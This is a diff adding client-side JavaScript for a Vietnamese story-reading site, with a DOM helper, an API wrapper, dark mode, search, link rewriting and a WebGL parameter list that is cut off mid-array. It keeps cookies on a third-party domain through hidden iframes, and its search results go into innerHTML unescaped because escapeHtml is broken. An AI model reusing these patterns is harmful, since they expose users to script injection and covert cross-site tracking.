@@ -1,0 +1,1219 @@
+class ElementCollection extends Array {
+    ready(cb) {
+        const isReady = this.some(e => {
+            return e.readyState != null && e.readyState != "loading";
+        });
+        if (isReady) {
+            cb();
+        } else {
+            this.on("DOMContentLoaded", cb);
+        }
+        return this;
+    }
+
+    each(cb){
+        this.forEach(cb);
+    }
+
+    get(idx){
+        return this[idx];
+    }
+
+    find(param){
+        var elms = new ElementCollection(),es,j;
+        for(var i=0;i<this.length;i++){
+            es = this[i].querySelectorAll(param);
+            for(var j=0;j<es.length;j++){
+                elms.push(es[j]);
+            }
+        }
+        return elms;
+    }
+
+    on(event, cbOrSelector, cb) {
+        if (typeof cbOrSelector === "function") {
+            this.forEach(e => e.addEventListener(event, cbOrSelector))
+        } else {
+            this.forEach(elem => {
+                elem.addEventListener(event, e => {
+                    if (e.target.matches(cbOrSelector) || $(e.target).parents(cbOrSelector).length){
+                        cb(e);
+                    }
+                })
+            })
+        }
+        return this;
+    }
+
+    html(content){
+        if(typeof content == "undefined") return this[0].innerHTML;
+        this.forEach(elem => {elem.innerHTML = content});
+        return this;
+    }
+    text(content){
+        if(typeof content == "undefined") return this[0].innerText;
+        this.forEach(elem => {elem.innerText = content});
+        return this;
+    }
+
+    append(content){
+        this.forEach(elem => {elem.innerHTML += content});
+        return this;
+    }
+    prepend(content){
+        this.forEach(elem => {elem.innerHTML = content+elem.innerHTML});
+        return this;
+    }
+
+
+    insertBefore(content){
+        var div = document.createElement('div');
+        div.innerHTML = content;
+        this.forEach(function(el){
+            el.parentNode.insertBefore(div.firstChild,el);
+        });
+    }
+
+    next() {
+        return this.map(e => e.nextElementSibling).filter(e => e != null)
+    }
+
+    prev() {
+        return this.map(e => e.previousElementSibling).filter(e => e != null)
+    }
+
+    removeClass(className) {
+        this.forEach(e => e.classList.remove(className));
+        return this
+    }
+
+    addClass(className) {
+        this.forEach(e => e.classList.add(className));
+        return this
+    }
+
+    hasClass(className){
+        for(var i=0;i<this.length;i++){
+            if(!this[i].classList.contains(className)) return false;
+        }
+        return true;
+    }
+
+    attr(attribute,value){
+        if(typeof value ==  "undefined") return this[0].getAttribute(attribute);
+        this.forEach(e => e.setAttribute(attribute,value));
+        return this;
+    }
+
+    removeAttr(attribute){
+        this.forEach(e => e.removeAttribute(attribute));
+    }
+
+    data(attribute,value){
+        return this.attr('data-'+attribute,value);
+    }
+
+    val(value){
+        if(typeof value == "undefined" && typeof this[0] != "undefined") return this[0].value;
+        this.forEach(e => e.value=value);
+        return this;
+    }
+
+    remove(){
+        this.forEach(e => e.parentNode.removeChild(e));
+        return this;
+    }
+    replaceWith(data){
+        this.forEach(function(e){
+            $(e).insertBefore(data);
+            e.parentNode.removeChild(e);
+        });
+        return this;
+    }
+
+    css(property, value) {
+        if(typeof property == "object"){
+            this.forEach(function(e){
+                var camelProp;
+                for(var k in property){
+                    camelProp = k.replace(/(-[a-z])/g, g => {
+                        return g.replace("-", "").toUpperCase()
+                    });
+                    e.style[camelProp] = property[k];
+                }
+            });
+            return this;
+        }
+        const camelProp = property.replace(/(-[a-z])/, g => {
+            return g.replace("-", "").toUpperCase()
+        });
+        this.forEach(e => (e.style[camelProp] = value));
+        return this
+    }
+
+    height(){
+        return this[0].offsetHeight;
+    }
+
+    width(){
+        return this[0].offsetWidth;
+    }
+
+    offset(){
+        const el = this[0];
+        const rect = el.getBoundingClientRect();
+        return {
+            left: rect.left + window.scrollX,
+            top: rect.top + window.scrollY,
+            bottom: rect.bottom + window.scrollY,
+            right: rect.right + window.scrollX
+        };
+    }
+
+    click(){
+        this.forEach(e => e.click());
+    }
+    prop(prop){
+        return this[0][prop];
+    }
+
+    parents(selector){
+        var elms = new ElementCollection(),es,j;
+        if (!Element.prototype.matches) {
+            Element.prototype.matches =
+                Element.prototype.matchesSelector ||
+                Element.prototype.mozMatchesSelector ||
+                Element.prototype.msMatchesSelector ||
+                Element.prototype.oMatchesSelector ||
+                Element.prototype.webkitMatchesSelector ||
+                function(s) {
+                    var matches = (this.document || this.ownerDocument).querySelectorAll(s),
+                        i = matches.length;
+                    while (--i >= 0 && matches.item(i) !== this) {}
+                    return i > -1;
+                };
+        }
+
+        // Set up a parent array
+        var elem;
+        for(var i=0;i<this.length;i++){
+            elem = this[i];
+            for ( ; elem && elem !== document; elem = elem.parentNode ) {
+                if (selector) {
+                    if (elem.matches(selector)) {
+                        elms.push(elem);
+                    }
+                    continue;
+                }
+                elms.push(elem);
+            }
+        }
+        return elms;
+    }
+}
+$cookie = {
+    prefix: 'tcom_',
+    domain: 'cc.adflycode.com',
+    initID: function() {
+        var a = '';
+        var b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var c = b.length;
+        for (var i = 0; i < 10; i++) {
+            a += b.charAt(Math.floor(Math.random() * c))
+        }
+        return a
+    },
+    get: function(e, f) {
+        var g = document.createElement('iframe');
+        g.id = 'cookieIfr';
+        g.src = 'https://' + $cookie.domain + '/getCookie.html';
+        g.width = 0;
+        g.height = 0;
+        var h = function(a) {
+            if (a.origin !== "https://" + $cookie.domain)
+                return '';
+            if (a.data == 'done') {
+                var b;
+                if (e.indexOf(';') !== -1) {
+                    var c = e.split(';');
+                    for (var i = 0; i < c.length; i++) {
+                        c[i] = $cookie.prefix + c[i]
+                    }
+                    b = c.join(';')
+                } else
+                    b = $cookie.prefix + e;
+                g.contentWindow.postMessage({
+                    q: 'get',
+                    name: b,
+                    id: j
+                }, '*');
+                return
+            }
+            if (a.data.id == j) {
+                window.removeEventListener('message', h);
+                document.body.removeChild(g);
+                if (typeof a.data.value === 'object') {
+                    var d = {};
+                    for (var k in a.data.value)
+                        d[k.replace($cookie.prefix, '')] = a.data.value[k];
+                    f(d)
+                } else
+                    f(a.data.value)
+            }
+        };
+        window.addEventListener('message', h);
+        document.body.appendChild(g);
+        var j = $cookie.initID()
+    },
+    set: function(b, c, d) {
+        var e = document.createElement('iframe');
+        e.src = 'https://' + $cookie.domain + '/setCookie.php?t=' + (new Date).getTime() + '&key=' + $cookie.prefix + b + '&value=' + encodeURIComponent(c) + '&exp=' + (d * 24 * 3600);
+        e.width = 0;
+        e.height = 0;
+        var f = function(a) {
+            if (a.origin !== "https://" + $cookie.domain)
+                return '';
+            if (a.data == 'done') {
+                window.removeEventListener('message', f);
+                setTimeout(function() {
+                    document.body.removeChild(e)
+                }, 500)
+            }
+        };
+        window.addEventListener('message', f);
+        document.body.appendChild(e)
+    },
+    find: function(c, d) {
+        var e = document.createElement('iframe');
+        e.src = 'https://' + $cookie.domain + '/getCookie.html?dev=1';
+        e.width = 0;
+        e.height = 0;
+        var f = $cookie.initID();
+        var g = function(a) {
+            if (a.origin !== "https://" + $cookie.domain)
+                return '';
+            if (a.data == 'done') {
+                e.contentWindow.postMessage({
+                    q: 'find',
+                    prefix: $cookie.prefix,
+                    name: c,
+                    id: f
+                }, '*');
+                return
+            }
+            if (a.data.id == f) {
+                window.removeEventListener('message', g);
+                document.body.removeChild(e);
+                var b = {};
+                for (var k in a.data.found)
+                    b[k.replace($cookie.prefix, '')] = a.data.found[k];
+                d(b)
+            }
+        };
+        window.addEventListener('message', g);
+        document.body.appendChild(e)
+    }
+};
+function $(param) {
+    if (typeof param === "string" || param instanceof String) {
+        return new ElementCollection(...document.querySelectorAll(param))
+    }else {
+        return new ElementCollection(param)
+    }
+}
+var loadDeferredStyles = function() { var addStylesNode = document.getElementById("deferred-styles"); var replacement = document.createElement("div"); replacement.innerHTML = addStylesNode.textContent; document.body.appendChild(replacement); addStylesNode.parentElement.removeChild(addStylesNode); }; var raf = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame; if (raf) raf(function() { window.setTimeout(loadDeferredStyles, 0); }); else window.addEventListener("load", loadDeferredStyles);
+isMobile = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(ad|hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test((navigator.userAgent || navigator.vendor || window.opera)) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test((navigator.userAgent || navigator.vendor || window.opera).substr(0, 4));
+if (isMobile === false && navigator.userAgent.match(/Mac/) && navigator.maxTouchPoints && navigator.maxTouchPoints > 2) {
+    isMobile = true;
+}
+window.mobile_tablet = false; if (typeof window.matchMedia === "function") {
+    if (isMobile && window.matchMedia("only screen and (min-width: 600px)").matches) window.mobile_tablet = true;
+}
+var API = function(){
+    var baseUri = '';
+    var errorHandler = function(request){
+        if(request.responseText){
+            var data = JSON.parse(request.responseText);
+            return alert(data.error);
+        }
+        var error = request.statusText;
+        return alert(error);
+    };
+    var call = function(url,method,data,type,headers,success,error_callback){
+        var xhr = new XMLHttpRequest();
+        if(url.substr(0,1)!='/') url = '/'+url;
+        var requestUrl = baseUri+url;
+        if(method=='GET' && data){
+            var prs = [];
+            for(var p in data){
+                if(data.hasOwnProperty(p)){
+                    prs.push(p+'='+data[p]);
+                }
+            }
+            if(requestUrl.indexOf('?')!=-1) requestUrl+='&'+prs.join('&');
+            else requestUrl += '?'+prs.join('&');
+        }
+        xhr.open(method,requestUrl,true);
+        xhr.onload = function () {
+            if (xhr.readyState == 4){
+                if(parseInt(xhr.status)>299){
+                    if(typeof error_callback =='function') return error_callback(xhr);
+                    return errorHandler(xhr);
+                }
+                if(typeof success !='function') return;
+                if(xhr.responseText=='') return success({});
+                return success(JSON.parse(xhr.responseText));
+            }
+        };
+        if(!headers) headers = {'Content-Language':document.documentElement.lang};
+        var sendData = null;
+        if(type=='json'){
+            sendData = JSON.stringify(data);
+            headers['Content-Type'] = 'application/json; charset=utf-8';
+        }else if(data && method!='GET'){
+            sendData = new FormData();
+            for(var k in data){
+                if(data.hasOwnProperty(k)) sendData.append(k,data[k]);
+            }
+        }
+        for(var h in headers){
+            if(headers.hasOwnProperty(h)) xhr.setRequestHeader(h,headers[h]);
+        }
+        xhr.send(sendData);
+    };
+    return {
+        setBaseUri: function(url){baseUri=url},
+        get: function(url,headers,data,success,error){
+            return call(url,'GET',data,null,headers,success,error);
+        },
+        post: function(url,headers,data,is_json,success,error){
+            if(is_json) return call(url,'POST',data,'json',headers,success,error);
+            return call(url,'POST',data,null,headers,success,error);
+        },
+        patch: function(url,headers,data,success,error){
+            return call(url,'PATCH',data,'json',headers,success,error);
+        },
+        put: function(url,headers,data,is_json,success,error){
+            if(typeof is_json=="function"){
+                error = success;
+                success = is_json;
+                is_json = true;
+            }
+            if(is_json) return call(url,'PUT',data,'json',headers,success,error);
+            return call(url,'PUT',data,null,headers,success,error);
+        },
+        delete: function(url,header,data,success,error){
+            return call(url,'DELETE',data,'json',header,success,error);
+        }
+    }
+}();
+API.setBaseUri('https://truyencom.com');
+function escapeHtml(str){
+    str.replace(/"/g, '\\"');
+    return str;
+}
+function str2url(str){
+    if(str!="") {
+        str= str.toLowerCase();
+        str= str.replace(/à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ/g,"a");
+        str= str.replace(/è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ/g,"e");
+        str= str.replace(/ì|í|ị|ỉ|ĩ/g,"i");
+        str= str.replace(/ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ/g,"o");
+        str= str.replace(/ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ/g,"u");
+        str= str.replace(/ỳ|ý|ỵ|ỷ|ỹ/g,"y");
+        str= str.replace(/đ/g,"d");
+        str= str.replace(/!|@|%|\^|\*|\(|\)|\+|\=|\<|\>|\?|\/|,|\.|\:|\;|\'| |\"|\&|\#|\[|\]|\“|\”|~|$|_/g,"-");
+        str= str.replace(/-+-/g,"-");
+        str= str.replace(/^\-+|\-+$/g,"");
+        return str;
+    }
+}
+var Main = function(){
+    var lazyImg = function(){
+        var lazyImages = [].slice.call(document.querySelectorAll("div.lazyimg"));
+        if ("IntersectionObserver" in window) {
+            var lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+                entries.forEach(function(entry) {
+                    if (entry.isIntersecting) {
+                        var lazyImage = entry.target;
+                        var img = document.createElement('img');
+                        img.setAttribute('src',isMobile?$(lazyImage).data('image'):$(lazyImage).data('desk-image'));
+                        img.className = $(lazyImage).data('classname');
+                        img.setAttribute('alt',$(lazyImage).data('alt'));
+                        lazyImageObserver.unobserve(lazyImage);
+                        lazyImage.parentNode.replaceChild(img,lazyImage);
+                    }
+                });
+            });
+            lazyImages.forEach(function(lazyImage) {
+                lazyImageObserver.observe(lazyImage);
+            });
+        } else {
+            var active = false;
+            var lazyLoad_fnc = function() {
+                if (active === false) {
+                    active = true;
+                    setTimeout(function() {
+                        lazyImages.forEach(function(lazyImage) {
+                            if ((lazyImage.getBoundingClientRect().top <= window.innerHeight && lazyImage.getBoundingClientRect().bottom >= 0) && getComputedStyle(lazyImage).display !== "none") {
+                                var img = document.createElement('img');
+                                img.setAttribute('src',isMobile?$(lazyImage).data('image'):$(lazyImage).getAttribute('desk-image'));
+                                img.className = $(lazyImage).data('classname');
+                                img.setAttribute('alt',$(lazyImage).data('alt'));
+                                lazyImage.parentNode.replaceChild(img,lazyImage);
+                                if (lazyImages.length === 0) {
+                                    document.removeEventListener("scroll", lazyLoad_fnc,{passive: true});
+                                    window.removeEventListener("resize", lazyLoad_fnc);
+                                    window.removeEventListener("orientationchange", lazyLoad_fnc);
+                                }
+                            }
+                        });
+                        active = false;
+                    }, 200);
+                }
+            };
+            document.addEventListener("scroll", lazyLoad_fnc,{passive: true});
+            window.addEventListener("resize", lazyLoad_fnc);
+            window.addEventListener("orientationchange", lazyLoad_fnc);
+            lazyLoad_fnc();
+        }
+    };
+    var darkmode = function(){
+        $('input[name="dark-switch"]').on('click',function () {
+            var answer = this.value;
+            $cookie.get('bgcolor-cookie',function(bgcolor){
+                if (answer == 'yes') {
+                    if (bgcolor && bgcolor != '#232323') $cookie.set('bgcolor-backup-cookie', bgcolor, 365);
+                    bgcolor = '#232323';
+                    $("body").css({
+                        "background-color": bgcolor,
+                        "background-image": "url('//cdn.truyencom.com/img/bg_dark.gif')",
+                        "background-repeat": "repeat"
+                    }).addClass('dark-theme');
+                    fbcolor = 'dark';
+                    bgcolor = "#232323";
+                    if ($('#truyen-background').length) $('#truyen-background').val(bgcolor).addClass('disabled').attr('disabled', true);
+                    $cookie.set('bgcolor-cookie', bgcolor, 365);
+                } else {
+                    $cookie.get('bgcolor-backup-cookie',function(bgcolor_backup){
+                        if (bgcolor_backup) bgcolor = bgcolor_backup; else bgcolor = '#F4F4F4';
+                        if ($('#truyen-background').length) {
+                            if (bgcolor == 'hatsan') {
+                                $("body").css({
+                                    "background-color": "#f2f2f2",
+                                    "background-image": "url('//cdn.truyencom.com/img/bg_op.png')",
+                                    "background-repeat": "repeat"
+                                }).removeClass('dark-theme');
+                                fbcolor = 'light';
+                            } else if (bgcolor == 'sachcu') {
+                                $("body").css({
+                                    "background-color": "#c2b49b",
+                                    "background-image": "url('//cdn.truyencom.com/img/bg_book_op.png')",
+                                    "background-repeat": "repeat"
+                                }).removeClass('dark-theme');
+                                fbcolor = 'light';
+                            } else if (bgcolor == '#232323') {
+                                $("body").css({
+                                    "background-color": bgcolor,
+                                    "background-image": "url('//cdn.truyencom.com/img/bg_dark.gif')",
+                                    "background-repeat": "repeat"
+                                }).addClass('dark-theme');
+                                fbcolor = 'dark';
+                            } else {
+                                $("body").css({"background-color": bgcolor, "background-image": "none"}).removeClass('dark-theme');
+                                fbcolor = 'light';
+                            }
+                        } else {
+                            $("body").css({
+                                "background-color": '#F4F4F4',
+                                "background-image": "url('//cdn.truyencom.com/img/bg.jpg')",
+                                "background-position-x": "center",
+                                "background-position-y": "top",
+                                "background-repeat-x": "repeat",
+                                "background-repeat-y": "no-repeat"
+                            }).removeClass('dark-theme');
+                            fbcolor = 'light';
+                        }
+                        $cookie.set('bgcolor-cookie', bgcolor, 365);
+                        if ($('#truyen-background').length) $('#truyen-background').val(bgcolor).removeClass('disabled').removeAttr('disabled');
+                    });
+                }
+            });
+        });
+        $cookie.get('bgcolor-cookie',function(bgcolor){
+            if (bgcolor == '#232323'){
+                $("body").css({
+                    "background-color": bgcolor,
+                    "background-image": "url('//cdn.truyencom.com/img/bg_dark.gif')",
+                    "background-repeat": "repeat"
+                }).addClass('dark-theme');
+                fbcolor = 'dark';
+            }else if ($('#truyen-background').length){
+                if (bgcolor == 'hatsan') {
+                    $("body").css({
+                        "background-color": "#f2f2f2",
+                        "background-image": "url('//cdn.truyencom.com/img/bg_op.png')",
+                        "background-repeat": "repeat"
+                    }).removeClass('dark-theme');
+                    fbcolor = 'light';
+                } else if (bgcolor == 'sachcu') {
+                    $("body").css({
+                        "background-color": "#c2b49b",
+                        "background-image": "url('//cdn.truyencom.com/img/bg_book_op.png')",
+                        "background-repeat": "repeat"
+                    }).removeClass('dark-theme');
+                    fbcolor = 'light';
+                } else {
+                    $("body").css({"background-color": bgcolor, "background-image": "none"}).removeClass('dark-theme');
+                    fbcolor = 'light';
+                }
+            }
+        });
+        $('.dark-theme').on('mouseover', '.pagination li', function () {
+            if ($(this).next().hasClass('active')) $(this).children('a').css({
+                "border-right": "0",
+                "padding-right": "10px"
+            });
+        });
+    };
+    var storyLink = function(item){
+        return location.origin+'/'+item.alias+(parseInt(item.dmca)>0?'-f'+item.dmca:'')+'.'+item.storyID+'/';
+    };
+    var quick_search = function(str,$list) {
+        API.get('api/quicksearch/',null,{searchKey:str,t:(new Date).getTime()},function(data){
+            if(data.stories.length==0){
+                $list.html('<p style="text-align: center;font-style: italic">Không tìm thấy truyện nào</p>').removeClass('hide');
+                return;
+            }
+            var html = '';
+			var timestamp = (new Date()).getTime();
+            for(var i=0;i<data.stories.length;i++){
+                html += '<a href="'+storyLink(data.stories[i])+'?search_key='+str+'&t='+timestamp+'" class="list-group-item" title="'+escapeHtml(data.stories[i].title)+'">'+data.stories[i].title+'</a>';
+            }
+            $list.html(html).removeClass('hide');
+        });
+    };
+    return {
+        init: function(){
+            window.truyen_ascii = $("#truyen-ascii").val();
+            window.truyenid = $("#truyen-id").val();
+            window.fbcolor = 'light';
+            $cookie.get('bgcolor-cookie',function(val){
+                window.bgcolor = val;
+                if (bgcolor == "#232323") {
+                    fbcolor = 'dark';
+                    $('#dark-no').attr('checked', false);
+                    $('#dark-yes').attr('checked', true);
+                    if ($('#truyen-background').length) $('#truyen-background').addClass('disabled').attr('disabled', true);
+                }
+                if (bgcolor) {
+                    $('#truyen-background').val(bgcolor);
+                }
+                if(typeof chapterID == "number"){
+                    if (bgcolor == 'hatsan') {
+                        $("body").css({
+                            "background-color": "#f2f2f2",
+                            "background-image": "url('//static.trumtruyen.vip/img/bg_op.png')",
+                            "background-repeat": "repeat"
+                        }).removeClass('dark-theme');
+                        fbcolor = 'light';
+                    } else if (bgcolor == 'sachcu') {
+                        $("body").css({
+                            "background-color": "#c2b49b",
+                            "background-image": "url('//static.trumtruyen.vip/img/bg_book_op.png')",
+                            "background-repeat": "repeat"
+                        }).removeClass('dark-theme');
+                        fbcolor = 'light';
+                    } else if (bgcolor == '#232323') {
+                        $("body").css({
+                            "background-color": bgcolor,
+                            "background-image": "url('//static.trumtruyen.vip/img/bg_dark.gif')",
+                            "background-repeat": "repeat"
+                        }).addClass('dark-theme');
+                        fbcolor = 'dark';
+                    } else {
+                        $("body").css({"background-color": bgcolor, "background-image": "none"}).removeClass('dark-theme');
+                        fbcolor = 'light';
+                    }
+                }
+            });
+            $('.navbar-toggle').on('click',function(e){
+                var $target = $($(this).data('target'));
+                if($target.hasClass('collapse')) $target.removeClass('collapse');
+                else $target.addClass('collapse');
+            });
+            lazyImg();
+            $('.dropdown-toggle').on('click',function(){
+                if($(this.parentNode).hasClass('open')) return $(this.parentNode).removeClass('open');
+                $('.dropdown').removeClass('open');
+                $(this.parentNode).addClass('open');
+            });
+            $(document).on('click',function(e){
+                if($(e.target).parents('.settings').length) return;
+                if($(e.target).hasClass('toggle-settings-open') || $(e.target).parents('.toggle-settings-open').length) return;
+                if($(e.target).hasClass('dropdown-toggle')) return;
+                $('.dropdown').removeClass('open');
+            });
+            darkmode();
+            var thread = null;
+            $('#search-input,.input-suggest-search').on('keyup',function () {
+                var str = '';
+                clearTimeout(thread);
+                str = $(this).val();
+				var $list = $(this.parentNode.parentNode).find('.list-search-res');
+                if (str.length == 0) {
+                    $list.html("").addClass("hide");
+                } else if (str.length >= 3) {
+                    $list.html('<img src="//cdn.truyencom.com/img/loading-search.gif" alt="loading">').removeClass("hide");
+                    thread = setTimeout(function () {
+                        quick_search(str,$list);
+                    }, 500);
+                }
+            });
+            $('#search-input').on("paste", function () {
+                var str = '';
+                clearTimeout(thread);
+                var element = this;
+				var $list = $(this.parentNode.parentNode).find('.list-search-res');
+                setTimeout(function () {
+                    var str = $(element).val();
+                    if (str.length == 0) {
+                        $list.html("").addClass("hide");
+                    } else if (str.length >= 3) {
+                        $list.html('<img src="//cdn.truyencom.com/img/loading-search.gif" alt="loading">').removeClass("hide");
+                        thread = setTimeout(function () {
+                            quick_search(str,$list);
+                        }, 500);
+                    }
+                }, 0);
+            });
+            $('html').click(function (e) {
+                if (e.target.id != '#search-input') {
+                    $('.list-search-res').html("").addClass("hide");
+                }
+            });
+            $('.dropdown-menu, #list-chapter').on('click', 'form', function (e) {
+                e.stopPropagation();
+            });
+            if (isMobile) {
+                $(".col-truyen-main").addClass("no-hover");
+            }
+        }
+    }
+}();
+window.addEventListener('DOMContentLoaded',function(){
+    Main.init();
+});
+var xRedirect = function(){
+    var getLocation = function(href) {
+        var l = document.createElement("a");
+        l.href = href;
+        return l;
+    };
+    var isChapter = function(url){
+        var host = getLocation(url);
+        return (new RegExp('^\/([a-zA-Z0-9-_]+)\/([a-zA-Z0-9-_]+).html')).test(url.replace('https://'+host.hostname,''));
+    };
+    var replace_domain = function(to, bk){
+        var a_tags = document.getElementsByTagName('a');
+        var p = '',host;
+        //if(location.hostname!==to) p = '?t='+(new Date()).getTime();
+        for(var i=0;i<a_tags.length;i++){
+            if(isChapter(a_tags[i].href)){
+				host = getLocation(a_tags[i].href);
+				a_tags[i].href = a_tags[i].href.replace(host.hostname,to);
+                /*a_tags[i].addEventListener('click',function(e){
+                    e.preventDefault();
+                    var host = getLocation(this.href);
+                    if(typeof bk == "string" && this.href.match(/chuong-([1-3]).html/))
+                        location.href = this.href.replace(host.hostname,bk)+p;
+                    else location.href = this.href.replace(host.hostname,to)+p;
+                });*/
+            }
+        }
+    };
+    var isMobileGPU = function(){
+        function webgl(){
+            // WebGL
+            var webgl_1 = [
+                'VERSION',
+                'SHADING_LANGUAGE_VERSION',
+                'VENDOR', 'RENDERER',
+                'MAX_VERTEX_ATTRIBS',
+                'MAX_VERTEX_UNIFORM_VECTORS',
+                'MAX_VERTEX_TEXTURE_IMAGE_UNITS',
+                'MAX_VARYING_VECTORS',
+                'ALIASED_LINE_WIDTH_RANGE',
+                'ALIASED_POINT_SIZE_RANGE',
+                'MAX_FRAGMENT_UNIFORM_VECTORS',
+                'MAX_TEXTURE_IMAGE_UNITS',
+                [
+                    'RED_BITS',
+                    'GREEN_BITS',
+                    'BLUE_BITS',
+                    'ALPHA_BITS'
+                ],
+                [
+                    'DEPTH_BITS',
+                    'STENCIL_BITS'
+                ],
+                'MAX_RENDERBUFFER_SIZE',
+                'MAX_VIEWPORT_DIMS',
+                'MAX_TEXTURE_SIZE',
+                'MAX_CUBE_MAP_TEXTURE_SIZE',
+                'MAX_COMBINED_TEXTURE_IMAGE_UNITS'
+            ];
+
+            var webgl_2 = [
+                'MAX_VERTEX_UNIFORM_COMPONENTS',
+                'MAX_VERTEX_UNIFORM_BLOCKS',
+                'MAX_VERTEX_OUTPUT_COMPONENTS',
+                'MAX_VARYING_COMPONENTS',
+                'MAX_TRANSFORM_FEEDBACK_INTERLEAVED_COMPONENTS',
+                'MAX_TRANSFORM_FEEDBACK_SEPARATE_ATTRIBS',
+                'MAX_TRANSFORM_FEEDBACK_SEPARATE_COMPONENTS',
+                'MAX_FRAGMENT_UNIFORM_COMPONENTS',
+                'MAX_FRAGMENT_UNIFORM_BLOCKS',
+                'MAX_FRAGMENT_INPUT_COMPONENTS',
+                'MIN_PROGRAM_TEXEL_OFFSET',
+                'MAX_PROGRAM_TEXEL_OFFSET',
+                'MAX_DRAW_BUFFERS',
+                'MAX_COLOR_ATTACHMENTS',
+                'MAX_SAMPLES',
+                'MAX_3D_TEXTURE_SIZE',
+                'MAX_ARRAY_TEXTURE_LAYERS',
+                'MAX_TEXTURE_LOD_BIAS',
+                'MAX_UNIFORM_BUFFER_BINDINGS',
+                'MAX_UNIFORM_BLOCK_SIZE',
+                'UNIFORM_BUFFER_OFFSET_ALIGNMENT',
+                'MAX_COMBINED_UNIFORM_BLOCKS',
+                'MAX_COMBINED_VERTEX_UNIFORM_COMPONENTS',
+                'MAX_COMBINED_FRAGMENT_UNIFORM_COMPONENTS'
+            ];
+
+            var webgl_other = [
+                'ACTIVE_TEXTURE',
+                'ARRAY_BUFFER_BINDING',
+                'BLEND',
+                'BLEND_COLOR',
+                'BLEND_DST_ALPHA',
+                'BLEND_DST_RGB',
+                'BLEND_EQUATION_ALPHA',
+                'BLEND_EQUATION_RGB',
+                'BLEND_SRC_ALPHA',
+                'BLEND_SRC_RGB',
+                'COLOR_CLEAR_VALUE',
+                'COLOR_WRITEMASK',
+                'COMPRESSED_TEXTURE_FORMATS',
+                'CULL_FACE',
+                'CULL_FACE_MODE',
+                'CURRENT_PROGRAM',
+                'DEPTH_CLEAR_VALUE',
+                'DEPTH_FUNC',
+                'DEPTH_RANGE',
+                'DEPTH_TEST',
+                'DEPTH_WRITEMASK',
+                'DITHER',
+                'ELEMENT_ARRAY_BUFFER_BINDING',
+                'FRAMEBUFFER_BINDING',
+                'FRONT_FACE',
+                'GENERATE_MIPMAP_HINT',
+                'LINE_WIDTH',
+                'MAX_TEXTURE_MAX_ANISOTROPY_EXT',
+                'PACK_ALIGNMENT',
+                'POLYGON_OFFSET_FACTOR',
+                'POLYGON_OFFSET_FILL',
+                'POLYGON_OFFSET_UNITS',
+                'RENDERBUFFER_BINDING',
+                'SAMPLE_BUFFERS',
+                'SAMPLE_COVERAGE_INVERT',
+                'SAMPLE_COVERAGE_VALUE',
+                'SAMPLES',
+                'SCISSOR_BOX',
+                'SCISSOR_TEST',
+                'STENCIL_BACK_FAIL',
+                'STENCIL_BACK_FUNC',
+                'STENCIL_BACK_PASS_DEPTH_FAIL',
+                'STENCIL_BACK_PASS_DEPTH_PASS',
+                'STENCIL_BACK_REF',
+                'STENCIL_BACK_VALUE_MASK',
